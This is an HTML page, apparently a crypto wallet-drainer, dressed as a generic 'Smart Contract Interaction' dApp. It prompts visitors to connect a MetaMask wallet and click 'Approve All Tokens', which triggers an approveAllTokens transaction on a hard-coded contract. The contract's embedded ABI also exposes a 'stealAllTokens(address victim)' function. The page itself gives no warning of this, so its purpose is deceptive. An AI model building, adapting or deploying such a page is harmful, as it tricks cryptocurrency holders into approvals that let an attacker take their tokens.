pp<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Contract Interaction</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f3f3f3;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:disabled {
            background-color: #ccc;
        }
        .note {
            margin-top: 10px;
            font-size: 0.9em;
            color: gray;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Smart Contract Interaction</h1>
    <p>Connect your wallet to interact with the contract!</p>
    <button id="connectWalletButton" class="button">Connect Wallet</button>
    <br><br>
    <button id="approveTokensButton" class="button" disabled>Approve All Tokens</button>
    <p id="status" class="note"></p>
</div>

<script>
    let provider;
    let signer;
    const contractAddress = "0x33bfE1E0fa1355f906ea54A6F3f477E95b33Efff"; // Smart contract address
    const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // ERC-20 token address
    const contractABI = [
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "token",
    "type": "address"
   }
  ],
  "name": "approveAllTokens",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "victim",
    "type": "address"
   }
  ],
  "name": "stealAllTokens",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [],
  "stateMutability": "nonpayable",
  "type": "constructor"
 },
 {
  "inputs": [],
  "name": "owner",
  "outputs": [
   {
    "internalType": "address",
    "name": "",
    "type": "address"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 }
];

    async function connectWallet() {
        try {
            if (!window.ethereum) throw new Error("MetaMask not installed");

            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();

            document.getElementById("status").textContent = "Wallet connected successfully!";
            document.getElementById("approveTokensButton").disabled = false;
        } catch (error) {
            console.error("Failed to connect wallet:", error);
            document.getElementById("status").textContent = "Failed to connect wallet.";
        }
    }

    async function approveAllTokens() {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const tx = await contract.approveAllTokens(tokenAddress);
            console.log("Transaction sent:", tx.hash);

            document.getElementById("status").textContent = "Transaction sent: " + tx.hash;

            await tx.wait();
            document.getElementById("status").textContent = "Tokens approved successfully!";
        } catch (error) {
            console.error("Failed to approve tokens:", error);
            document.getElementById("status").textContent = "Failed to approve tokens. Please try again.";
        }
    }

    document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
    document.getElementById("approveTokensButton").addEventListener("click", approveAllTokens);
</script>

</body>
</html>
